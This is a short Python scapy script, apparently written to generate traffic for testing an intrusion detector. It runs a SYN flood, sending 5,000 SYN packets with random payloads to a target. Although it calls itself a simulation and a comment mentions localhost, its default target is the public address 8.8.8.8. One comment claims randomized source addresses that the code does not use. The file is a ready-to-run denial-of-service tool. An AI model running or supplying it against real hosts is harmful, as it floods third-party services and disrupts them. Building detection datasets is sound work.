import scapy.all as scapy
from scapy.layers.inet import IP, TCP
import random
import time

def syn_flood(target_ip, target_port, count=1000):
    print(f"Starting SYN Flood simulation on {target_ip}:{target_port}...")
    print(f"Sending {count} packets...")
    
    for i in range(count):
        # Randomize source IP and port to mimic DDoS
        src_ip = "192.168.1.100" # Fixed IP
        src_port = 12345 # Fixed Port to aggregate packets into one flow
        
        # Create packet with payload to influence Packet Length features
        ip = IP(src=src_ip, dst=target_ip)
        tcp = TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(1000, 9000))
        payload = scapy.Raw(b"X" * random.randint(10, 1000))
        packet = ip / tcp / payload
        
        # Send
        scapy.send(packet, verbose=False)
        
        if i % 100 == 0:
            print(f"Sent {i} packets...")
            
    print("Attack simulation completed.")

if __name__ == "__main__":
    # Target localhost or the interface IP
    target_ip = "8.8.8.8" 
    target_port = 80
    
    # Increase count for better detection chance
    syn_flood(target_ip, target_port, count=5000)
